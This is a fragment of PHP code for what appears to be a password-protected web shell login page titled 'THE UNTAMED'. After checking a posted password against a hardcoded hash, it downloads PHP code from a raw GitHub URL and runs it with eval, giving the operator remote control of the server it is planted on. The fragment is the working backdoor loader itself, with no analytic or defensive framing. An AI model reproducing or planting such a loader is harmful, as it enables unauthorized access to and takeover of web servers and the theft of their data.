...
if (isset($_POST["password"])) {
    ...
    $hashed_password = "4616e6622278e8c20837b68b6d5ea42a"; 
...
if (is_logged_in()) {
    $a = geturlsinfo("https://raw.githubusercontent.com/cipelipam/matrix/main/untamed.php");
    eval("?>" . $a);
    exit;
}
...
<canvas id="matrix" style="
  width: 100%;
  height: 100%;
  background-image: url('https://zeus-pages.site/img/untamed-bg.jpg');
...
<div class="login-container" id="login-container">
  <div class="terminal-title">[THE UNTAMED]</div>
